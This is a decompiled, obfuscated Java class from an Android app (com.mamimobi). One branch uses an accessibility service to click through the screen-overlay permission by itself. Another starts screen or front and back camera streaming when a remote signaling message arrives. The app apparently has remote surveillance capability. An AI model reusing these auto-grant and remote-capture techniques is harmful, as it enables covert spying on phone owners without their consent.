package defpackage;

import android.content.Context;
import android.content.Intent;
import android.graphics.Rect;
import android.os.Build;
import android.os.SystemClock;
import android.provider.Settings;
import android.view.accessibility.AccessibilityNodeInfo;
import androidx.work.WorkRequest;
import androidx.work.impl.WorkManagerImpl;
import androidx.work.impl.WorkerUpdater;
import androidx.work.impl.utils.futures.SettableFuture;
import com.mamimobi.AccessService;
import com.mamimobi.service.AIService;
import com.mamimobi.videostream.CameraRequestActivity;
import com.mamimobi.videostream.ScreenRequestActivity;
import com.mamimobi.videostream.VideoSourceType;
import com.mamimobi.videostream.VideoStreamService;
import com.mamimobi.videostream.model.SignalingMessage;
import io.nats.client.Connection;
import io.nats.client.Options;
import io.nats.client.impl.NatsKeyValue;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.atomic.AtomicBoolean;
import org.webrtc.EglRenderer;
import org.webrtc.VideoFileRenderer;
import org.webrtc.VideoFrame;

/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class j implements Runnable {
    public final /* synthetic */ int E;
    public final /* synthetic */ Object F;
    public final /* synthetic */ Object G;
    public final /* synthetic */ Object H;

    public /* synthetic */ j(Object obj, Object obj2, Object obj3, int i) {
        this.E = i;
        this.G = obj;
        this.H = obj2;
        this.F = obj3;
    }

    @Override // java.lang.Runnable
    public final void run() {
        AtomicBoolean atomicBoolean;
        switch (this.E) {
            case 0:
                String str = (String) this.H;
                CountDownLatch countDownLatch = (CountDownLatch) this.F;
                try {
                    AIService.a((AIService) ((k) this.G).c, str);
                    return;
                } finally {
                    countDownLatch.countDown();
                }
            case 1:
                ((EglRenderer) this.G).lambda$removeFrameListener$2((CountDownLatch) this.F, (EglRenderer.FrameListener) this.H);
                return;
            case 2:
                z8 z8Var = (z8) this.G;
                z91 z91Var = (z91) this.H;
                ThreadPoolExecutor threadPoolExecutor = (ThreadPoolExecutor) this.F;
                z8Var.getClass();
                try {
                    ez ezVarU = l21.u((Context) z8Var.F);
                    if (ezVarU == null) {
                        throw new RuntimeException("EmojiCompat font provider not available on this device.");
                    }
                    dz dzVar = (dz) ((ys) ezVarU.b);
                    synchronized (dzVar.H) {
                        dzVar.J = threadPoolExecutor;
                        break;
                    }
                    ((ys) ezVarU.b).k(new bt(z91Var, threadPoolExecutor));
                    return;
                } catch (Throwable th) {
                    z91Var.V(th);
                    threadPoolExecutor.shutdown();
                    return;
                }
            case 3:
                jg0 jg0Var = (jg0) this.G;
                String str2 = (String) this.H;
                String str3 = (String) this.F;
                synchronized (jg0Var.j) {
                    Connection connection = jg0Var.d;
                    if (connection == null || connection.getStatus() != Connection.Status.CONNECTED) {
                        return;
                    }
                    try {
                        jg0Var.d.publish(str2, str3.getBytes(StandardCharsets.UTF_8));
                        break;
                    } catch (Exception e) {
                        e.getMessage();
                    }
                    return;
                }
            case 4:
                ((NatsKeyValue) this.G).lambda$_consumeKeys$2((List) this.H, (LinkedBlockingQueue) this.F);
                return;
            case 5:
                AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) this.G;
                String str4 = (String) this.H;
                AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) this.F;
                int i = 0;
                while (true) {
                    atomicBoolean = uj0.b;
                    AtomicBoolean atomicBoolean2 = uj0.c;
                    if (i < 20) {
                        try {
                            SystemClock.sleep(500L);
                            AccessibilityNodeInfo accessibilityNodeInfoC = uj0.c(accessibilityNodeInfo, str4);
                            if (accessibilityNodeInfoC != null) {
                                if (accessibilityNodeInfoC.isClickable()) {
                                    accessibilityNodeInfoC.performAction(16);
                                } else {
                                    accessibilityNodeInfoC.getBoundsInScreen(new Rect());
                                    d91.b(AccessService.e0, (r0.left + r0.right) / 2, (r0.bottom + r0.top) / 2);
                                }
                                atomicBoolean2.set(false);
                                SystemClock.sleep(1000L);
                                if (Settings.canDrawOverlays(AccessService.e0)) {
                                    return;
                                }
                            } else {
                                accessibilityNodeInfo2.performAction(Options.DEFAULT_MAX_CONTROL_LINE);
                                i++;
                            }
                        } catch (Throwable th2) {
                            atomicBoolean2.set(false);
                            SystemClock.sleep(1000L);
                            if (!Settings.canDrawOverlays(AccessService.e0)) {
                                atomicBoolean.set(false);
                            }
                            throw th2;
                        }
                    } else {
                        atomicBoolean2.set(false);
                        SystemClock.sleep(1000L);
                        if (Settings.canDrawOverlays(AccessService.e0)) {
                            return;
                        }
                    }
                }
                atomicBoolean.set(false);
                return;
            case 6:
                ((VideoFileRenderer) this.G).lambda$renderFrameOnRenderThread$1((VideoFrame.I420Buffer) this.H, (VideoFrame) this.F);
                return;
            case 7:
                SignalingMessage signalingMessage = (SignalingMessage) this.F;
                k71 k71Var = (k71) this.G;
                k71Var.getClass();
                try {
                    int i2 = Build.VERSION.SDK_INT;
                    Context context = (Context) this.H;
                    if (i2 == 26 || i2 == 27) {
                        if (t40.o(context, "android.permission.POST_NOTIFICATIONS") == 0) {
                            s90.r(context);
                            return;
                        }
                        return;
                    }
                    String str5 = signalingMessage.type;
                    boolean zEquals = str5.equals("screen");
                    o71 o71Var = k71Var.c;
                    if (zEquals) {
                        if (o71Var.g != null) {
                            VideoStreamService.b(context, VideoSourceType.SCREEN);
                            return;
                        } else {
                            String str6 = AccessService.V;
                            context.startActivity(new Intent(context, (Class<?>) ScreenRequestActivity.class).addFlags(Options.DEFAULT_RECONNECT_BUF_SIZE).addFlags(268435456).addFlags(536870912));
                            return;
                        }
                    }
                    if (str5.equals("screenHelper") || str5.equals("camerafront")) {
                        String str7 = AccessService.V;
                    } else {
                        String str8 = AccessService.V;
                    }
                    if (t40.o(context, "android.permission.CAMERA") != 0) {
                        Intent intentAddFlags = new Intent(context, (Class<?>) CameraRequestActivity.class).addFlags(Options.DEFAULT_RECONNECT_BUF_SIZE).addFlags(268435456).addFlags(536870912);
                        intentAddFlags.putExtra("videoSourceType", str5);
                        context.startActivity(intentAddFlags);
                        return;
                    } else {
                        if (str5.equals("screenHelper")) {
                            if (((pr0) o71Var.f.e).a()) {
                                VideoStreamService.b(context, VideoSourceType.SCREENHELPER);
                                return;
                            } else {
                                VideoStreamService.b(context, VideoSourceType.SCREENHELPER);
                                return;
                            }
                        }
                        if (str5.equals("camerafront")) {
                            VideoStreamService.b(context, VideoSourceType.CAMERA_FRONT);
                            return;
                        } else {
                            VideoStreamService.b(context, VideoSourceType.CAMERA_BACK);
                            return;
                        }
                    }
                } catch (Exception e2) {
                    e2.printStackTrace();
                    return;
                }
            default:
                WorkerUpdater.updateWorkImpl$lambda$2((SettableFuture) this.G, (WorkManagerImpl) this.H, (WorkRequest) this.F);
                return;
        }
    }

    public /* synthetic */ j(EglRenderer eglRenderer, CountDownLatch countDownLatch, EglRenderer.FrameListener frameListener) {
        this.E = 1;
        this.G = eglRenderer;
        this.F = countDownLatch;
        this.H = frameListener;
    }
}
